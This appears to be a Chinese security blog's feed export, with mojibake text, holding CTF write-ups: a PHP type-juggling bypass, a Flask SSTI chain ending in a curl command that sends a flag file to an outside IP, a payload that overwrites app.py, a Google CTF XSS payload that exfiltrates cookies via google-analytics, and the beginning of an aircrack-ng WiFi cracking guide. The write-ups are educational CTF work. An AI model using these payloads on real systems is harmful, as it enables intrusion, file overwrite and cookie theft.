class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¹æ˜“çœ‹åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$same_count</span>++;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ•°æ®çš„ä¼ å…¥æ²¡æœ‰åšé™åˆ¶,é‚£ä¹ˆæˆ‘ä»¬åªè¦å»æ„é€ ä¸€ä¸‹jsonå°±å¯ä»¥æ‹¿åˆ°flag,ä¼—æ‰€å‘¨çŸ¥,å¼±ç±»å‹çš„å­—ç¬¦åªè¦ä¸æ˜¯'0'éƒ½ç­‰äºBoolç±»å‹çš„True,é‚£ä¹ˆæ„é€ å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$new</span> = <span class="keyword">array</span>(True,True,True,True,True,True,True);</span><br><span class="line"><span class="variable">$num</span> = <span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&quot;buy&quot;</span>,<span class="string">&quot;numbers&quot;</span>=&gt; <span class="variable">$new</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$num</span>);</span><br><span class="line"><span class="comment">//&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span></span><br></pre></td></tr></table></figure><p>ç®€å•ä¼ å‡ æ¬¡å°±æ‹¿åˆ°è¶³å¤Ÿé‡‘å¸,ä¹°åˆ°flag <img src="/images/2018/07/3-1.jpg" alt="blacsheep" /> <img src="/images/2018/07/4-1.jpg" alt="blacsheep" /> ä¸æ˜¯å¾ˆæ‡‚é‚£äº›æŒ‚ç€è„šæœ¬èƒ½æ‹¿åˆ°flagçš„äºº...çœŸæ˜¯æ‰“æ‰°äº†...</p><h3 id="confusion1">Confusion1</h3><p><strong>confusion1çš„æè¿°:One day, Bob said "PHP is the best language!", but Alice didn't agree it, so Alice write a website to proof it. She published it before finish it but I find something WRONG at some page.(Please DO NOT use scanner!)</strong> æ´å¾ˆå¥½æ‰¾,ä½†ç»•è¿‡ç¡®å®èŠ±äº†æˆ‘è›®ä¹…çš„... flaskçš„ssti <img src="/images/2018/07/5-1.jpg" alt="blacsheep" /> æºç é‡Œè·å¾—æç¤º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;</span><br><span class="line">&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt;</span><br></pre></td></tr></table></figure><p>ok,ä¸€èˆ¬æ¥è¯´å°±ç›´æ¥ä¸€æ³¢payloadæ‰“è¿‡å»,æ¯”è¾ƒç»å…¸çš„å°±æ˜¯ç”¨objectç±»çš„å­ç±»fileæ¥read,ä½†æ˜¯å¹¶ä¸è¡Œ <img src="/images/2018/07/6-1.jpg" alt="blacsheep" /> ç±»ä¼¼çš„è¿‡æ»¤çš„è¿˜æœ‰class,lsç­‰ä¸€äº›å…³é”®çš„å­—ç¬¦ä¸² è¿‡æ»¤å‚è€ƒçš„ä¸€ç¯‡æ–‡ç«  <a href="https://0day.work/jinja2-template-injection-filter-bypasses/" title="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a> é‡Œé¢æä¾›äº†ä¸€äº›bypass æä¾›ä¸€ä¸ªç®€å•çš„æµ‹è¯•è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    temp=<span class="built_in">input</span>()</span><br><span class="line">    r=requests.get(<span class="string">&quot;http://47.96.118.255:2333/&#123;&#123;&quot;</span>+temp+<span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">    res=re.findall(<span class="string">r&#x27;The requested URL .+ was not found on this server&#x27;</span>,r.text)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(res[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;&gt;&quot;</span>).replace(<span class="string">&#x27;&#x27;&#x27;,&quot;&#x27;&quot;))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(r.text)</span></span><br></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">request</span><br><span class="line">The requested URL /&lt;Request &#x27;http://47.96.118.255:2333/&#123;&#123;request&#125;&#125;&#x27; [GET]&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;]</span><br><span class="line">The requested URL /&lt;class &#x27;flask.wrappers.Request&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__</span><br><span class="line">The requested URL /(&lt;class &#x27;werkzeug.wrappers.Request&#x27;&gt;, &lt;class &#x27;flask.wrappers.JSONMixin&#x27;&gt;) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__</span><br><span class="line">The requested URL /(&lt;class &#x27;werkzeug.wrappers.BaseRequest&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.AcceptMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.CommonRequestDescriptorsMixin&#x27;&gt;) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__</span><br><span class="line">The requested URL /(&lt;type &#x27;object&#x27;&gt;,) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0]</span><br><span class="line">The requested URL /&lt;type &#x27;object&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;ss__&quot;]</span><br><span class="line">The requested URL / was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]</span><br><span class="line">The requested URL /&lt;built-in method __subclasses__ of type object at 0x7ff87ae16c40&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]()[40]</span><br><span class="line">The requested URL /&lt;type &#x27;file&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__.values()[12].__getattribute__(&#x27;s&#x27;+&#x27;ystem&#x27;)(&#x27;curl http://119.28.22.85/`tac /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt`&#x27;)</span><br><span class="line">The requested URL /0 was not found on this server</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/7.jpg" alt="blacsheep" /> ç„¶åvpsä¸Šæ‹¿åˆ°flag <img src="/images/2018/07/flag.jpg" alt="blacsheep" /> subclassesä¹‹å‰ä¸€ç›´æ‰“æˆsubclass,å¿ƒç–¼è‡ªå·±...åƒäº†æ²¡æ–‡åŒ–çš„äºorz... è¿™é‡Œä¹Ÿè®°å½•ä¸€ä¸ªå°å½©è›‹å§,æ‰“requestçš„æ—¶å€™å‘ç°requesté‡Œé¢æœ‰ä¸ªfileæˆå‘˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request[&#x27;environ&#x27;][&quot;wsgi.errors&quot;]</span><br><span class="line">The requested URL /&lt;open file &#x27;&lt;stderr&gt;&#x27;, mode &#x27;w&#x27; at 0x7ff87b04c1e0&gt; was not found on this server</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¹²ä»€ä¹ˆå‘¢?æˆ‘ä»¬å¯ä»¥è°ƒç”¨è¿™ä¸ªæˆå‘˜çš„__init__å‡½æ•°,å°†è¿™ä¸ªæ–‡ä»¶è¿›è¡Œé‡æ‰“å¼€,ä¹‹åçš„æ–‡ä»¶å°±å¯ä»¥ä»»æ„å†™äº†,æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;request[&#x27;environ&#x27;][&#x27;wsgi.errors&#x27;].__init__(&#x27;./app.py&#x27;,&#x27;w&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/Screenshot-from-2018-07-16-17-34-01.png" alt="blacsheep" /> ç„¶åæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æœ¬åœ°çš„app.pyè¢«è¦†ç›–äº† <img src="/images/2018/07/Screenshot-from-2018-07-16-17-35-16.png" alt="blacsheep" /> å¦‚æœæŸä¸ªç›®å½•è¿˜æœ‰ä¸ªphpæœåŠ¡ä½ å°±å¯ä»¥å»å†™ä¸ªphpçš„shell,ä¸è¿‡ç›´æ¥è®¿é—®ä¼šè¢«è½¬ä¹‰æ‰å­—ç¬¦,ç”¨burpæŠ“ä¸€ä¸‹å°±ä¸ä¼šäº† <img src="/images/2018/07/Screenshot-from-2018-07-16-17-53-51.png" alt="blacsheep" /> æµ‹è¯•çš„app.pyæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒæœ‰æ„æ€,ä¸è¿‡å½“å¤©æ¯”èµ›çš„æ—¶å€™å¾ˆè¿·,æ¯æ¬¡æˆ‘ä¸€å†™æ–‡ä»¶(å¹¶ä¸æ˜¯å†™çš„app.py,å½“æ—¶æ˜¯éšæ„å†™çš„ä¸€ä¸ª123.php)ï¼ŒæœåŠ¡å™¨å°±ç›´æ¥å®•æœº...å¯è¿˜è¡Œ... æœ€åä¸€é“webæ²¡çœ‹,æ™šä¸ŠæœåŠ¡å™¨åæ­£åˆå®•æœºäº†,ä¸æ˜¯æˆ‘æ‰“çš„...ä¹‹åå†è¯´å§..</p><h3 id="åè®°">åè®°</h3><p>ç¯å¢ƒå·²ç»å…³é—­äº†,å¤ç°çœ‹ä»–ä»¬å¼€ä¸å¼€æºå§,æœ€åä¸€é“webåˆæ˜¯pythonååºåˆ—åŒ–,è€ç”Ÿå¸¸è°ˆçš„é—®é¢˜äº†,è¿™é‡Œæ”¾ä¸€ä¸‹å®˜æ–¹wp:<a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" title="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a> ç„¶åç¬¬ä¸‰ä¸ªwebä»–ä»¬ç»•è¿‡æ¯”æˆ‘çš„ç®€å•,ä»–ä»¬æ˜¯è°ƒç”¨çš„å…¶å®ƒå‚æ•°æ¥è·å–çš„,payloadå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.[request.args.a][request.args.b][<span class="number">2</span>][request.args.c]()[<span class="number">40</span>](<span class="string">&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;</span>)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>googleCTFä¸­ä¸€é“xssé¢˜</title>
      <link href="/2018/07/13/googlectf%E4%B8%AD%E4%B8%80%E9%81%93xss%E9%A2%98/"/>
      <url>/2018/07/13/googlectf%E4%B8%AD%E4%B8%80%E9%81%93xss%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ä¸‹åˆåˆšå¥½æœ‰æ—¶é—´,æ‰“ç®—å­¦ä¸€ä¸‹ç»•cspçš„xss,ç„¶åçœ‹åˆ°äº†orangeå¸ˆå‚…çš„ä¸€é“googleCTFé¢˜çš„wp,æ„Ÿè§‰æŒºæœ‰æ„æ€çš„,è¿™é‡Œè®°å½•ä¸€ä¸‹ é¢˜ç›®åœ°å€:<a href="https://gcalc2.web.ctfcompetition.com/" title="https://gcalc2.web.ctfcompetition.com/">https://gcalc2.web.ctfcompetition.com/</a> å¤§æ¦‚çš„å°±æ˜¯è¿™ä¸ªæ˜¯ä¸ªè®¡ç®—å™¨ <img src="/images/2018/07/calc.jpg" alt="blacsheep" /> ä¸‹é¢çš„try itå¯ä»¥å‘ä¸€ä¸ªreportè¯·æ±‚ç»™admin,permalinkå¯ä»¥æŸ¥çœ‹é“¾æ¥,æŸ¥çœ‹ä¸€ä¸‹å‘ç°ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/?expr=&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gcalc2.web.ctfcompetition.com/?expr=vars.pi*3&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°exprå¯ä»¥ç”¨varsé‡Œçš„ä¸œè¥¿ æŸ¥çœ‹jså‘ç°è°ƒç”¨éƒ¨åˆ†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    a = <span class="title class_">String</span>(a).<span class="title function_">toLowerCase</span>();</span><br><span class="line">    b = <span class="title class_">String</span>(b);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^(?:[\(\)\*\/\+%\-0-9 ]\bvars\b[.]\w+)*$/</span>.<span class="title function_">test</span>(a))</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">Error</span>(a);</span><br><span class="line">    b = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(b, <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &amp;&amp; <span class="string">&quot;object&quot;</span> === <span class="keyword">typeof</span> b &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(b))</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), b);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;number&quot;</span> === <span class="keyword">typeof</span> b)</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;vars&quot;</span>,<span class="string">&quot;return &quot;</span> + a))(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ‰§è¡Œa,bä½œä¸ºåŒ¿åå‡½æ•°çš„å‚æ•° æ¯”å¦‚a="alert(b)",b="123"å°±ä¼šå¼¹ä¸ª123çš„çª— ä¸è¿‡aä¼šè¿‡ä¸€æ¬¡æ­£åˆ™,æˆ‘ä»¬çœ‹ä¸€ä¸‹æ­£åˆ™ <img src="/images/2018/07/image.png" alt="blacsheep" /> ä¹Ÿå°±æ˜¯è¯´payloadå¿…é¡»ä¸º</p><blockquote><p>1.å‰é¢ä¸€å—çš„å­—ç¬¦ 2.vars,ä¸¤è¾¹ä¸ºboundary 3.ç‚¹+æ•°å­—å­—æ¯</p></blockquote><p>Functionç±»çš„æœ€åä¸€ä¸ªå‚æ•°ä¼šè¢«æ‰§è¡Œ,è¿™é‡Œå­¦åˆ°äº†æ–°çš„xssæŠ€å·§...å¯ä»¥ç”¨<code>constructor.constructor(CODE)()</code>æ¥xss,æ¯”å¦‚è¯´ä½ æœ‰ä¸ªvarsçš„object,varsæœ‰ä¸ªpiå±æ€§,ç„¶åä¸‹é¢è¿™æ®µä»£ç ä¼šå¼¹çª—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://regex101.com/r/FLdJ7h/1</span></span><br><span class="line"><span class="comment">// alert(1) </span></span><br><span class="line"><span class="comment">// Remove whitespaces by yourself</span></span><br><span class="line">vars.<span class="property">pi</span>.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">97</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">108</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">101</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">114</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">116</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">40</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">49</span>)+</span></span><br><span class="line"><span class="params">  vars.pi.toString().constructor.fromCharCode(<span class="number">41</span>)</span></span><br><span class="line"><span class="params"></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure><p>æœ¬æ¥è¿™æ ·ä¹Ÿå°±å®Œæˆäº†æ”»å‡»,ä½†æ˜¯functioné‡Œé¢æœ‰ä¸ªtoLowerCase,å¯¼è‡´ä¸èƒ½ç”¨toString</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    a = <span class="title class_">String</span>(a).<span class="title function_">toLowerCase</span>();</span><br><span class="line">    b = <span class="title class_">String</span>(b);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>ç„¶åorangeå¸ˆå‚…åˆæƒ³äº†ä¸€ä¸ªpayload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://regex101.com/r/IMXgwR/1</span></span><br><span class="line">(<span class="number">1</span>).<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  /<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(vars).pop()</span></span><br><span class="line"><span class="params"></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‰é¢ç”¨äº†constructorè°ƒå‡ºObjectç±»,ç„¶åç”¨keys(vars).pop()æ¥è·å–varsçš„æœ€åä¸€ä¸ªæˆå‘˜çš„key,æˆ‘ä»¬ä»è€Œå¯ä»¥é€šè¿‡varsæ¥æ„é€ payload ç¬¬ä¸€ç‰ˆpayload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//gcalc2.web.ctfcompetition.com/?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0,&quot;alert(1)&quot;:0&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/alert-1.jpg" alt="blacsheep" /> ä¸è¿‡åˆ°è¿™é‡Œè¿˜å¹¶æ²¡æœ‰å®Œ å‘ç°å¤´éƒ¨CSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: default-src &#x27;self&#x27;; child-src https://sandbox-gcalc2.web.ctfcompetition.com/</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¹¶ä¸èƒ½æŠŠcookieæ‰“å‡ºå» ä¸è¿‡åæ¥å‘ç° /static/calc.htmlçš„CSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//https://sandbox-gcalc2.web.ctfcompetition.com/static/calc.html</span><br><span class="line"></span><br><span class="line">content-security-policy: default-src &#x27;self&#x27;; </span><br><span class="line">frame-ancestors https://gcalc2.web.ctfcompetition.com/; </span><br><span class="line">font-src https://fonts.gstatic.com; </span><br><span class="line">style-src &#x27;self&#x27; https://*.googleapis.com &#x27;unsafe-inline&#x27;; </span><br><span class="line">script-src &#x27;self&#x27; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com &#x27;unsafe-eval&#x27; https://www.googletagmanager.com; </span><br><span class="line">child-src https://www.google.com/recaptcha/; </span><br><span class="line">img-src https://www.google-analytics.com;</span><br></pre></td></tr></table></figure><p>ok,å‘ç°å¯ä»¥ç”¨www.google-analytics æ”¾ä¸€ç¯‡hackeroneçš„æäº¤æŠ¥å‘Š <a href="https://hackerone.com/reports/199779" title="https://hackerone.com/reports/199779">https://hackerone.com/reports/199779</a> ç„¶ågoogleçš„console <a href="https://analytics.google.com/analytics/web/" title="https://analytics.google.com/analytics/web/">https://analytics.google.com/analytics/web/</a> æ‰€ä»¥æˆ‘ä»¬å¾—ä»¥æ„é€ æœ€åçš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox-gcalc2.web.ctfcompetition.com/static/calc.html?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()&amp;vars=&#123;&quot;pi&quot;:3.14159,&quot;ans&quot;:0, &quot;x=document.createElement(&#x27;img&#x27;);x.src=&#x27;https://www.google-analytics.com/collect?v=1&amp;tid=UA-xxxxxxxxx-x&amp;cid=xxxxxxxxx&amp;t=event&amp;ec=email&amp;ea=&#x27;+encodeURIComponent(document.cookie);document.querySelector(&#x27;body&#x27;).append(x)&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„tidå’Œcidæ˜¯ä½ çš„è·Ÿè¸ªidå’Œç”¨æˆ·id,è‡ªå·±ä¿®æ”¹ æœ¬æ¥è¿™é‡Œæ˜¯å¯ä»¥ç›´æ¥æ‹¿åˆ°flagçš„,ä½†æ˜¯å…¶å®å¡«äº†ä¹‹åå‘ç°å¹¶æ²¡æœ‰å‘åˆ°åç«¯ <img src="/images/2018/07/res-1.jpg" alt="blacsheep" /> è‡ªå·±ä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥äº†,chromeè°ƒè¯•ä¿®æ”¹æˆ–è€…burpéƒ½è¡Œ <img src="/images/2018/07/res-3.jpg" alt="blacsheep" /> æ”¹å®Œè®©chromeå‘å‡ºå»,ç„¶åpostä¸€ä¸ªreport,å°±å¯ä»¥æ‹¿åˆ°flagäº† <img src="/images/2018/07/res-2.jpg" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wifiå¯†ç ç ´è§£</title>
      <link href="/2018/07/05/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2018/07/05/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>ç®€å•è®°å½•,ç ´è§£çš„æ—¶å€™ä¸€èˆ¬éœ€è¦å­—å…¸,kaliè‡ªå¸¦ä¸€ä¸ªå­—å…¸/user/share/wordlists/rockyou.txt.gz,è§£å‹å³å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /user/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure><h3 id="åˆ‡ç½‘å¡æ¨¡å¼">åˆ‡ç½‘å¡æ¨¡å¼</h3><p>å°†æˆ‘ä»¬çš„ç½‘å¡æ”¹æˆç›‘æ§æ¨¡å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airemon-ng start wlan0</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/Screenshot-from-2018-07-05-23-51-19.png" alt="blacsheep" /> åˆ‡æ¢ä¹‹åifconfigæŸ¥çœ‹,ç½‘å¡çš„æ¥å£ä¼šå˜æˆwlan0mon <img src="/images/2018/07/Screenshot-from-2018-07-05-23-51-32.png" alt="blacsheep" /></p><h3 id="æŸ¥çœ‹ç½‘ç»œ">æŸ¥çœ‹ç½‘ç»œ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°wifiç½‘ç»œçš„åˆ—è¡¨å’Œä¸€äº›ä¿¡æ¯ <img src="/images/2018/07/fix_3.png" alt="blacsheep" /></p><h3 id="æŠ“æ¡æ‰‹åŒ…">æŠ“æ¡æ‰‹åŒ…</h3><p>åˆ©ç”¨ç½‘å¡çš„ç›‘å¬æ¨¡å¼æŠ“å–å‘¨å›´æ— çº¿ç½‘ç»œçš„æ•°æ®åŒ…,æœ€é‡è¦çš„åŒ…ä¹Ÿå°±æ˜¯åŒ…å«å¯†ç 